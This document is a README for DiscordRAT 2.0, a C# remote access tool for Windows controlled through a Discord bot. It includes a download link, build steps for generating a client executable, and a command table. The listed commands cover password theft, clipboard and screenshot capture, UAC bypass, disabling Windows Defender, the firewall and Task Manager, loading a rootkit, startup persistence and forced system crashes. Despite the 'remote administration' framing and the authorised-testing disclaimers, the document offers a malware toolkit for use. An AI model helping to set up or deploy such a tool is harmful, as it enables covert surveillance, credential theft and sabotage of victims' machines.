# DiscordRAT 2.0

**Discord Remote Administration Tool written in C#**

DiscordRAT 2.0 is a Windows-based remote administration project that uses a Discord bot as its communication interface. It includes multiple system administration and monitoring capabilities, with more than 40 available modules.

The application is designed for Windows x64 systems and uses Discord channels to manage and communicate with connected clients.

## Features

- Discord-based communication
- Remote command execution
- System information retrieval
- File management operations
- Screenshot capture
- Clipboard access
- Process monitoring
- Audio playback
- System configuration controls
- Remote session management
- Additional system administration modules

## Requirements

- Windows x64
- Discord account
- Discord Developer Portal access
- Discord bot
- .NET runtime or dependencies required by the application

## Setup Guide

### 1. Download the Application

Download the available compiled binaries from the project's release page:

[DiscordRAT 2.0 Releases](https://github.com/TheFDAApproved/IAS102_4B)

### 2. Create a Discord Bot

1. Visit the Discord Developer Portal.
2. Create a new application.
3. Navigate to the Bot section.
4. Create a bot and configure its required permissions.
5. Add the bot to your Discord server.

### 3. Configure the Application

1. Open `builder.exe`.
2. Enter the Discord bot token.
3. Enter the Discord server (Guild) ID.
4. Complete the configuration process.

### 4. Launch the Application

The application generates a client executable named `Client-built.exe`.

**Security note:** Only test remote administration software in an isolated environment using systems and accounts you own or have explicit permission to administer. Do not deploy it on other people's devices.

### 5. Prepare a safe testing environment

1. Use a Windows virtual machine.
2. Take a VM snapshot before testing.
3. Keep shared folders and clipboard sharing disabled.
4. Do not use your personal Discord account or personal files.
5. Do not connect the test machine to systems you don't own.
6. Use a separate test Discord server.

## Command Reference

The following commands are documented in the project:

| Command | Description |
|---|---|
| `!message` | Display a message box. |
| `!shell` | Execute a shell command. |
| `!voice` | Generate spoken audio from text. |
| `!admincheck` | Check administrator privileges. |
| `!cd` | Change the current directory. |
| `!dir` | Display directory contents. |
| `!download` | Retrieve a file from a connected client. |
| `!upload` | Transfer a file to a connected client. |
| `!uploadlink` | Transfer a file using a link. |
| `!delete` | Delete a specified file. |
| `!write` | Type text on the connected computer. |
| `!wallpaper` | Change the desktop wallpaper. |
| `!clipboard` | Retrieve clipboard contents. |
| `!idletime` | Check user idle time. |
| `!currentdir` | Display the current directory. |
| `!block` | Block keyboard and mouse input. |
| `!unblock` | Restore keyboard and mouse input. |
| `!screenshot` | Capture the current screen. |
| `!exit` | Exit the application. |
| `!kill` | Terminate a connected session. |
| `!uacbypass` | Attempt privilege escalation through UAC bypass. |
| `!shutdown` | Shut down the computer. |
| `!restart` | Restart the computer. |
| `!logoff` | Log off the current user. |
| `!bluescreen` | Trigger a system crash. |
| `!datetime` | Display system date and time. |
| `!prockill` | Terminate a specified process. |
| `!disabledefender` | Disable Windows Defender. |
| `!disablefirewall` | Disable Windows Firewall. |
| `!audio` | Play an audio file. |
| `!critproc` | Mark the application as a critical process. |
| `!uncritproc` | Remove critical process status. |
| `!website` | Open a specified website. |
| `!disabletaskmgr` | Disable Task Manager. |
| `!enabletaskmgr` | Re-enable Task Manager. |
| `!startup` | Configure application startup execution. |
| `!geolocate` | Estimate a device's location using its IP address. |
| `!listprocess` | Display running processes. |
| `!password` | Attempt to retrieve stored passwords. |
| `!rootkit` | Load the rootkit component. |
| `!unrootkit` | Remove the rootkit component. |
| `!help` | Display the available commands. |

## Platform Compatibility

- Operating System: Windows
- Architecture: x64
- Communication Interface: Discord Bot
- Programming Language: C#

## Project Information

This repository contains the DiscordRAT 2.0 project documentation and its associated application components.

**Important:** This software contains powerful remote access capabilities. Use it only in authorized testing environments and never against devices or accounts without permission.